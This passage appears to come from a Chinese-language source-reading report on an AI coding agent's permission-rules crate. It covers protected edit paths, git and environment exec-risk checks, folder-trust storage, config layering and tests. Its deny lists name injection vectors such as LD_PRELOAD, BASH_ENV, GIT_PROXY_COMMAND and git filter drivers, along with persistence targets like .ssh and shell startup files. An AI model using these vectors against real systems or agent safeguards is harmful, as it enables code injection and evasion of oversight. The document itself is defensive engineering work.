- 受保护地板：`ProtectedEditReason`（:378）= `HookRoot|GitHooks|Ssh|StartupFile|Etc|GrokConfig|GrokSandbox|ClaudeSettings|
  CursorHooks|Sensitive`（`kind` :393、`description` :408 用户可见「Note: This edit contains changes to …」）。
  `protected_edit_reason`（:480）表：`STARTUP_FILES`（:490-508 共 17 项 `.bashrc .bash_profile .bash_login .bash_logout
  .profile .zshrc .zshenv .zprofile .zlogin .zlogout .kshrc .cshrc .tcshrc .login .logout .inputrc .xprofile`）、
  `.claude/settings.json(.local)`（:513）、`.cursor/hooks.json`（:518）、git hooks（:521）、任意层级 `.ssh`（:524）、
  grok 配置（:530）、`/etc` 前缀（:533）。`protected_grok_config_file`（:542）另覆盖 `permission*.toml`（要求 `sessions/`
  祖先，:556-568）、`mcp.json`/`lsp.json`（:575）、`sandbox.toml` ⇒ GrokSandbox（:576），`grok_home_matches`（:588）同时比
  lexical 与 resolved；hook 根 `path_is_under_user_grok_hook_root`（:596，`hooks/` 与 `hooks-paths`）。
  **相对路径一律 `Sensitive`**（`edit_target_protection` :463-465）；解析后落在 `/etc` 内 ⇒ `Sensitive`（:476-477）；
  `is_safe_write_sink`（:372）只认 `/dev/null|/dev/stdout|/dev/stderr` 精确串。输出 `ProtectedEditPermission`（:445，ACP
  `_meta` camelCase，`from_reason` :452）。写路径抽取：`WritePathsSplit`（:311，含 `unextracted_write_redirect` fail-closed
  信号）、`command_write_paths_split`（:321）、`is_creation_program`（:353 `mkdir|touch`）；不透明 shell：
  `words_are_opaque_shell`（:1004）+`tree_has_opaque_shell`（:1013）、`ExecutionScope`（:662）+`script_has_cwd_change`（:749）。

### 4.7 exec / env / git 风险（`R/exec_risk.rs` 957/11、`R/env_risk.rs` 56、`R/git_content_filters.rs` 284/9）

- `normalize_for_exec_risk`（:24）：exhausted / split-string / chdir / ambiguous 任一 ⇒ FailClosed。
  `sort_has_compress_program_flag`（:90，最短 `--co`）、`is_git_config_env_flag`（:106，最短 `--co` 长 4）、
  `is_git_repo_retarget_flag`（:116，认缩写 `--gi`/`--wor`）、`attached_git_c_path`（:134）、
  `git_global_option_takes_value`（:139 = `-C -c --git-dir --work-tree --namespace --super-prefix --exec-path --list-cmds
  --attr-source --config-env`）、`git_has_exec_risk_global`（:162，只看子命令之前，缺值 fail closed）、
  `segment_exec_facts`（:216）+`SegmentExecFacts`（:210）。
- git 只读查询白名单**单一来源**：`SAFE_GIT_SUBCOMMANDS`（:232，22 个：status branch log diff ls-files show rev-parse blame
  grep describe merge-base check-ignore check-attr cat-file ls-tree show-ref for-each-ref rev-list name-rev count-objects
  shortlog）；`GIT_QUERY_UNSAFE_OPTIONS`（:258）= `--filters --textconv --output --ext-diff --open-files-in-pager`；
  `git_query_option_is_unsafe`（:268）**唯一前缀缩写也算**（≥3 字符前缀 fail closed，注释点出 `git grep --text` vs
  `--textconv` 陷阱）；`git_safe_query_verb_index`（:278）只跳 `-C/--no-pager/-P/-C<attached>`，子命令前出现别的 ⇒ None；
  `git_words_have_unsafe_query_option`（:302）另抓 `git grep -O<cmd>`；`git_words_are_read_only_query`（:316）要求 `words[0]`
  恰为 `git`。
- 环境扫描：`local_repo_config_has_exec_risk`（:367）**只用 libgit2 且只看 include/includeIf**，读失败 ⇒ fail closed；
  `AmbientScanPlan`（:462）+`ambient_scan_plan_from_segments`（:468）+`ambient_exec_risk_from_plan`（:499）+
  `ambient_scan_plan_from_cmd`（:507）+`script_may_invoke_git`（:515，token 探针；`echo git $(true)` 这类裸 token 仍 fail closed）。
- env 三档：`EnvRisk`（`R/env_risk.rs`:20）`Safe|Injection|Unvetted`；`SAFE_ENV_KEYS`（:4）恰 12 个纯观感键
  （CARGO_TERM_COLOR、CARGO_TERM_PROGRESS_WHEN、RUST_LOG、RUST_LOG_STYLE、RUST_BACKTRACE、RUST_TEST_THREADS、RUST_MIN_STACK、
  NO_COLOR、CLICOLOR、CLICOLOR_FORCE、FORCE_COLOR、COLORTERM）；`INJECTION_ENV_KEYS`（:26）= LD_PRELOAD LD_AUDIT BASH_ENV ENV
  IFS PATH GIT_EXTERNAL_DIFF GIT_PROXY_COMMAND PROMPT_COMMAND；前缀（:38）= `DYLD_`、`GIT_CONFIG`；`env_key_risk`（:40）
  **大小写敏感精确匹配**。
- content-filter pin（无值守 git）：`filter_command_driver`（:6）识别 `filter.<d>.clean|smudge|process`，用 `get(..7)?`
  而非字节切片（注释 :7：多字节会 panic）；`read_local_git_config_entries`（:61）只取 Local/Worktree 层，`path_unreadable`
  （:48）拒目录/不可读，非 UTF-8 key ⇒ None（注释 :99），不支持的 `includeIf.<cond>` ⇒ None（:34/:102，只允许
  `gitdir`/`gitdir/i`/`onbranch`，因 libgit2 不求值 `hasconfig:remote.*.url`），无值布尔键视作 `true`（:117）但 filter 驱动键
  缺值 ⇒ None（:115，测试 `pins_valueless_filter_command_fail_closed` :194）；`local_content_filter_drivers`（:124）遇不可 pin
  的驱动名（含 `=`/空格/点）⇒ None（`filter_driver_name_is_pinnable` :25，测试 :266）；`content_filter_config_pins`（:143）
  对每个驱动产 4 条 `filter.X.clean=`、`.smudge=`、`.process=`、`.required=false`（注释 :147：required=false 防 status 报错后
  仍调用 required filter）；保留原大小写拼写（测试 `pins_mixed_case_driver_keeps_spelling` :251）。

### 4.8 folder trust / trust store / worktree 归并

- 纯判定：`decide`（:69）优先级写在 doc（:58-68）：①feature off ⇒ Trusted；②store 记录可信 ⇒ Trusted；③key 不可记录
  （`$HOME`、文件系统根、相对路径）⇒ Trusted；④无 trust-sensitive 配置 ⇒ Trusted；⑤交互式 ⇒ Prompt；⑥其余 ⇒ Untrusted。
  `resolve_trust`（:83）把 ③④ 标 `Provisional`（`is_durably_trusted` :115 只有 feature-off 与 store 是 durable）；注释
  （:80-81）**明确禁止缓存 no-configs 允许**：配置可由 `git pull` 或 agent 写入事后出现，缓存就会让后续 `/hooks reload` 在
  无信任决定下跑配置（TOCTOU）；`PromptPolicy::FailClosed` 时 Prompt ⇒ Untrusted/Durable（:102-105）。
- feature 开关：`feature_enabled_for_build`（:132）先判 `folder_trust_inert()`（:121）——**无 `GROK_VERSION` 编译戳的本地二进制
  信任一切且不读 store**（设了 `TEST_VERSION_ENV` 则恢复生效 :122）；否则
  `BoolFlag::env("GROK_FOLDER_TRUST").config(user.folder_trust.enabled).managed(…).feature_flag(remote.folder_trust_enabled)
  .default(true)`（:145-151 ⇒ 默认开）。
- store：`R/trust.rs` doc（:1-22）给出形状 `[folders."/abs/repo/root"] trusted/decided_at`、`0600` 原子写、根植于**全新
  `xai_dirs::resolve_grok_home`**（:19-22：绝不用 `grok_home()` OnceLock，也不写 cwd 相对 `./.grok`）⇒ 无 home 时
  `empty()`（:145）「什么都不信、什么都不写」，clone 自带的 `./.grok/trusted_folders.toml` 无法自我授权。
  `is_trusted`（:178）：不可读 store **不是空 allow-list**（:180 直接 false）；查询 key 先 canonicalize（:183），覆盖式匹配取
  最长深度，同深度并列 ⇒ `trusted &= record.trusted`（手工编辑出矛盾记录时 fail closed，注释 :185-187）；
  `has_decision`（:232）只精确匹配（供 legacy hook-trust 迁移避免覆盖用户已决）。
  写入 `record_decision_strict`（:249）：`is_unsafe_trust_root`（:438）⇒ `Recorded::Skipped`（:255-261）、无 backing path ⇒
  Skipped（:265-272）、`disk_readable==false` 先重试读（:275-280）、`ExclusiveLock`（:465，`fs2` 建议锁，旁车 `.toml.lock`
  :294）下**重读-改-写**（:299-303），`persist_doc`（:363）同目录 `NamedTempFile` + `sync_all` + `persist` 原子替换
  （注释 :380-382：`flush` 不保证落盘）；**内存只在落盘成功后提交**（:312-317）。`read_doc_strict`（:323）先
  `symlink_metadata` 探测：悬空符号链接算「存在」，绝不因 follow 时 NotFound 而当 Missing（注释 :321-322，防 persist 覆盖链接）。
- workspace key：`workspace_key`（:391）→ `git_derived_workspace_key`（:400）：①cwd 在 `<grok_home>/worktrees/` 下且
  `R/worktree.rs` · `source_repo_for_cwd`（:19）命中 ⇒ 用 source repo 的 **git root**（:402-409：覆盖 standalone clone 与
  从子目录起 `grok -w` 两种情况；source 已删则退回记录路径）；②`git2` 发现且 `repo.is_worktree()` 且 commondir 校验通过 ⇒
  折叠主 workdir（:413-420）；③否则 `repo.workdir()`；④非仓库 ⇒ canonicalize(cwd)；⑤结果若 `is_unsafe_trust_root` ⇒ 退回
  canonicalize(cwd)（:393-395）。`workspace_id`（:443）对不存在的路径先取最近存在祖先（git2 discover 对缺失路径会失败）。
- `R/worktree.rs` doc（:1-3）：这是 `xai-fast-worktree` `WorktreeDb::get` 的**只读副本**，理由是读 WAL 库可能创建
  `-wal/-shm`、网络盘上 open 还可能转换 journal mode；`open_read_only`（:44）经 `xai_sqlite_journal::JournalMode`，DB 不存在
  直接 None（测试 `missing_registry_is_a_miss_and_is_not_created` :186 断言未创建文件）；只支持 `SCHEMA_VERSION=1`（:12），
  其他版本 / 行不可解码 / `json` metadata 坏 ⇒ 一律 miss（:207/:224/:235 三条测试；SQL 里写 `json_valid(metadata)` :15）；
  `decode_source_repo`（:82）逐列解码 writer 的全部列（「writer 拒绝的行这里也拒绝」）；Windows 反斜杠路径不含 `/` 时走
  id→label 查找（`get` :66，测试 :246）。

## 5. 配置面与环境变量

| 键 / 变量 | 读取处（锚点） | 默认 / 语义 |
|---|---|---|
| env `GROK_FOLDER_TRUST` | `R/folder_trust.rs` · `feature_enabled_for_build`（+13，:145） | 覆盖 user/managed/remote；最终 `.default(true)`（:150）⇒ 默认开 |
| `[folder_trust].enabled`（user config.toml + managed_config.toml）、remote `folder_trust_enabled` | 同上（:137-143、:148） | 三级读取；本地无版本戳构建 ⇒ 全忽略（:133） |
| env `GROK_VERSION`（编译戳）/ `xai_grok_version::TEST_VERSION_ENV` | `folder_trust_inert`（:121-125） | 无戳 ⇒ folder trust 完全惰性 |
| env `_GROK_CLAUDE_MARKER_OVERRIDE=1` | `R/claude_settings.rs` · `is_claude_import_marked`（+3，:442） | 测试后门 ⇒ 跳过全部 .claude 读取 |
| `[claude_compat].imported` | 同上（:445-446 → `xai_grok_config::is_claude_import_marked`，`xai-grok-config/src/claude_import.rs:26`） | Phase-2 截止开关 |
| env `GROK_HOME` / `HOME` | `R/trust.rs` · `trust_store_home`（:448 → `xai_dirs::resolve_grok_home()`）、`R/claude_settings.rs`（:332） | 决定 store 与 `~/.claude` 位置；解析不到绝对路径 ⇒ store `path=None`（fail closed，:168-174） |
| env `DISABLE_TELEMETRY`、`DISABLE_FEEDBACK_COMMAND` | `R/resolution.rs` · `parse_managed_settings_base`（:739）经 `json_env_flag`（:818） | managed settings 的 `env`：数值 ≠0 / bool / 字符串不在 `0 "" false` ⇒ 生效 |
| `[ui] disable_bypass_permissions_mode` / legacy `[ui] yolo` | `resolve_yolo_policy_block`（:912）、`requirements_lock_bool`（:895） | `true` / `false` ⇒ YOLO 锁；非 bool ⇒ warn 且**不锁** |
| managed-settings.json（vendor） | `xai_grok_config::claude_managed_settings_path()`（`/etc/claude-code/managed-settings.json`，`xai-grok-config/src/paths.rs:6/:9`；仅 macOS/Linux，其他平台 `None`：`:39`） | Vendor tier + Advisory |
| `managed_config.toml`（`/etc/grok/`、`$GROK_HOME/`） | `xai-grok-config/src/loader.rs:94`（文件名）、`:147`（层序 system first → user last；坏层跳过并 warn） | `RequirementSource::ManagedConfig`（`R/types.rs`:151） |
| `requirements.toml`（user → system → macOS MDM） | `xai-grok-config/src/validation.rs:63`（MDM 最后压顶且标 `is_system`） | 最高约束层 |
| `[permissions]`（三处 TOML） | `R/resolution.rs` · `parse_toml_permission_section`（:96） | 先紧凑 `deny/allow/ask` 数组；非数组 ⇒ warn `"expected an array of rule strings"`（:110）；否则 verbose `PermissionConfig`（:137-142）；`extract_toml_permissions`（:159） |
| `[permissions].defaultMode` / `load_requirements_permissions` | `parse_default_mode_claiming_scope`（:72）、`load_requirements_permissions`（:191，按 `layer.is_system` 分 SystemRequirements/Requirements） | 六个合法值；非法 ⇒ Default 但声明 scope |
| mode 提示 `"alwaysAllow"` | `PERMISSION_MODE_ALWAYS_ALLOW`（:297）+`apply_permission_mode_hint`（:301） | pin 在 ⇒ 拒绝 |
| 项目 `.grok/config.toml` / `.mcp.json` | `R/project_config.rs` · `find_project_configs`（:59）/`find_mcp_json_files`（:28）/`MCP_JSON_FILENAME`（:10） | repo-root→cwd（root 优先级低）；排除 user-global 以免 `cwd==$HOME` 当项目覆盖（`is_user_grok_config_file` :42） |
| `trusted_folders.toml` | `R/trust.rs` · `TRUST_FILE_NAME`（:32 ← `xai-grok-config/src/loader.rs:100`） | `0600` + 原子写 + 旁车 `.toml.lock` |
| 受保护配置文件名 | `R/shell_access.rs` · `protected_grok_config_file`（:542-576） | `config.toml`/`managed_config.toml`/`requirements.toml`/`sandbox.toml`/`mcp.json`/`lsp.json`/`permission*.toml`(sessions/) |
| `worktrees.db` | `R/worktree.rs` · `WORKTREES_DB_FILE`（:10） | 只读；不存在 ⇒ miss，不创建 |

## 6. 测试矩阵（`grep -c '#\[test\]'` 合计 **369**；全部内嵌在 `src/`，`tests/` 只有 fixture）

| 模块（文件行数） | test 数 | 覆盖重点 / 代表用例 |
|---|---|---|
| `R/resolution_tests.rs`（2994） | 109 | 层序与 provenance：`merge_permissions_across_project_and_global_settings`、`untrusted_project_claude_permissions_are_not_honored`、`bypass_permissions_blocked_by_policy_pin`、`managed_default_mode_dont_ask_outranks_user_accept_edits`、`catchall_allow_detection`、`drop_untrusted_catchall_allows_is_source_aware`、`yolo_policy_block_from_requirements_layer`、`legacy_yolo_false_still_locks`、`non_bool_lock_key_warns_and_does_not_lock`、`dont_ask_sets_prompt_policy_through_public_api` |
| `R/policy.rs`（`mod tests` :907） | 61 | deny>ask>allow 组合、catchall 探针、`shell_dash_c_script` 各形态、exec-vehicle、tilde/`..` |
| `R/shell_access.rs`（:1345 起） | 51 | 读写操作数提取、重定向、`-c` 递归、symlink 升级、受保护路径全表 |
| `R/trust_tests.rs`（884） | 36 | store 读写/锁/悬空 symlink/unsafe root/`workspace_key` 归并 |
| `R/managed_policy/tests.rs`（3076） | 35 | 企业 JSON fixture（:2193）、tier/authority/ownership、allow vs deny 非对称、`managed_config_layers_at` 注入（:2412） |
| `R/bash_command_splitting.rs` | 23 | 白名单语法、剥壳、预算耗尽、heredoc/软换行（`soft_break_chunks` :1191） |
| `R/exec_risk.rs` | 11 | git 安全查询、缩写前缀、`-c/--git-dir` 全局、ambient 扫描 |
| `R/worktree.rs`（:96 起） | 10 | DB 缺失不创建、schema 版本、行解码失败、Windows 路径走 id/label、最新 label 行 |
| `R/git_content_filters.rs` | 9 | 非 UTF-8、目录代替文件、includeIf 不支持、恶意 driver 名、大小写保留 |
| `R/folder_trust.rs` | 7 | `decide`/`resolve_trust` 全矩阵；`local_build_ignores_explicit_env_optin`（:350）、`release_build_defaults_on`（:359） |
| `R/gate_preflight.rs` | 3 | 含 symlink 环强制 shell 提问（:229-279） |
| `R/rules.rs` 2、`R/policy/path_match_tests.rs` 2（仅 unix）、`R/source_identity_tests.rs` 2、`R/bash_permission_script_tests.rs` 2、`R/policy/bash_commands_tests.rs` 2、`R/domain.rs` 2、`R/types.rs` 1、`R/project_config.rs` 1 | 14 | 规则语法 / 路径形态 / git URL 身份 / 恢复解析 / 合取链 / 域名归一 / serde 名 / 项目配置排除 user 文件 |
| 测试基建 `R/test_support.rs`（91） | — | `ENV_TEST_LOCK`（:4：`cargo test --lib` 共享进程，故跨模块串行化 env 突变）、`TestEnvGuard`（:9：**先取锁后建 guard 以保证最后 drop**，注释 :7-8）、`capturing_warn_logs`（:59：`rebuild_interest_cache` :86 处理全局 interest；`CAPTURE_LOCK` :55） |

未确认：本次为只读侦察，**未运行 `cargo test`**，上表为静态计数，实际通过率未验证。

## 7. 旧文档改写表（旧路径 → 新路径 → 语义）

依据 `rg -n "src/permission" docs/adrian/sourceReader/*.md`（11 篇命中）+ `git ls-tree f0e3be11` 的搬迁前文件清单。

| 旧文档写法（文件:行） | 旧路径 | 新路径 | 语义 |
|---|---|---|---|
| `11-…:73`、`:253`；`15-…:543` | `WS/permission/policy.rs · CompiledPolicy(+74)` | `R/policy.rs · CompiledPolicy`（快照 :82） | **变了**：位置 + 偏移（+74→+82）；实现未变（`new` 的 `"*"` 过滤、三级 combine 仍在） |
| `11-…:267` | `WS/permission/shell_access.rs`（impl 头第 19 行） | `R/shell_access.rs`（impl 头仍 :19，`evaluate_shell_file_access` :21） | **成立**（仅换 crate；impl 头未漂移） |
| `11-…:75`；`15-…:42/:208`；`16-…:251/:464` | `WS/permission/gate_preflight.rs · GatePreflight`（第 15 行） | `R/gate_preflight.rs`（:15） | **成立**（行号未变，路径需加 crate 名） |
| `15-…:210`；`14-…:219` | `WS/permission/bash_command_splitting.rs`（tree-sitter 拆分）；「workspace 现在依赖 tree-sitter 0.26」 | `R/bash_command_splitting.rs`（`try_parse_shell` :42，全 crate 唯一实例化点） | **变了**：依赖归属应写**规则 crate**（`tree-sitter` workspace 级 0.26 + `tree-sitter-bash = "0.25"`；旧文档未记 grammar 版本） |
| `11-…:244`、`:568`；`16-…:465` | `WS/permission/types.rs` 的 `AccessKind/Decision/EditPolicy/PermissionConfig/RequirementSource/ToolFilter` | `R/types.rs`（:4/:29/:39/:79/:151/:136）；workspace 只剩 `WS/permission/types.rs:5` 的 `pub use …::types::*` | **变了**：定义搬走；`PermissionEvent/PermissionRequest/PermissionCommand/HookAsk/RequestPathContext` 确实仍留 workspace。`EditPolicy #[default] Ask`（:39）与「`Decision` 无 `derive Default`」（:28 仅 `Debug, Clone, PartialEq, Eq`）经复核**仍成立**（`可靠性与通用技术实现说明书.md:226` 的修正不需回退） |
| `11-…:608`；`10-…:572` | `WS/permission/reasons.rs`（25 常量 + `ALL`） | `R/reasons.rs`（:1-25、:27）；`WS/permission/mod.rs:18` re-export | **成立**（清单与数量不变；`HOOK_ASK`/`OPAQUE_SHELL`/`BASH_REQUEST_FLOOR` 均在此） |
| `16-…:467` | `WS/permission/exec_risk.rs`、`bash_permission_script.rs` | `R/exec_risk.rs`、`R/bash_permission_script.rs` | **成立**；建议补 §4.7 的具体白名单（`SAFE_GIT_SUBCOMMANDS` 22 项、`SAFE_ENV_KEYS` 12 项） |
| `11-…:540`（4.2「权限模块全貌」） | 全貌 = `WS/permission/` | 全貌 = 两处：`R/` 23387 + `WS/permission/` 29975（actor/grants/prompter/hub/sandbox/auto_mode） | **变了**：章节边界需重画；沙箱已由 `new-sandbox-command.md` 覆盖 |
| folder trust / trust store 相关段落 | 旧：判定 + 落盘在 `WS/folder_trust.rs`、`WS/trust.rs` | 新：`R/folder_trust.rs`（判定）、`R/trust.rs`（store）、`R/worktree.rs`（**私有**只读 DB 副本，`R/lib.rs:27`）；workspace 侧变 re-export 壳（`WS/folder_trust.rs:13`、`WS/trust.rs:4-5`） | **变了**：`worktrees.db` 读取从 `xai-fast-worktree` 复制进规则 crate（`R/worktree.rs:1-3` 给动机），文档需注明「只读副本 + 绝不创建 DB」 |
| `06-…:448`；`可靠性…:216/:624`；`03-…:446`；`02-…:479`；`01-…:249`；`15-…:41/:198/:574`；`16-…:115/:182/:207/:250/:325` | `WS/permission/manager/mod.rs · PermissionHandle(67)/request(269)/clamp_yolo(318)` | **不变**（actor 层未搬出 workspace；`WS/permission/mod.rs` 现仅 119 行门面） | **成立**：只需把「规则求值细节」指向新 crate；`clamp_yolo` 是 YOLO 锁的**实际强制点**，旧文档未与 `R/resolution.rs:912` 的锁来源区分 |
| 上述各篇均未覆盖的新内容 | — | `R/managed_policy/`（tier/authority/ownership + URL allow/deny 非对称）、`R/resolution.rs`（6 层合并 + YOLO 锁 + Claude 兼容）、`R/git_content_filters.rs`、`R/env_risk.rs`、`R/policy/path_match.rs`、`R/repo.rs`、`R/project_config.rs`、`R/source_identity.rs`、`R/domain.rs`、`R/util.rs` | **新增/未确认**：`path_match.rs`、`env_risk.rs`、`source_identity.rs`、`worktree.rs` 在 f0e3be11 的 workspace 树中**无同名旧文件**（`domain/util/project_config/git_content_filters/repo/trust/folder_trust` 则来自 `WS/*` 顶层或 `TOOLS`/`AGENT`），因此旧文档对这些内容没有可对照的基线，属首次建档 |

结论式修正清单（供后续改写正文用）：①所有 `crates/codegen/xai-grok-workspace/src/permission/{policy,shell_access,gate_preflight,
bash_command_splitting,bash_permission_script,exec_risk,claude_settings,reasons,resolution,rules,types,managed_policy/*}` 引用
必须整体换成 `crates/codegen/xai-grok-permission-rules/src/…`（**同名、未重命名**）；②`trust/folder_trust/project_config/
git_content_filters/domain/repo/source_identity/env_risk/util/path_match/worktree` 属于**从 workspace 其他目录并入或全新出现**，
旧文档若曾引用 `WS/trust.rs`、`WS/folder_trust.rs`、`WS/project_config.rs`、`WS/git_content_filters.rs`、`WS/util/mod.rs`
（f0e3be11 实测存在这些路径）需一并改写；③actor/弹窗/grants/hub/sandbox/auto_mode 的旧锚点全部有效。
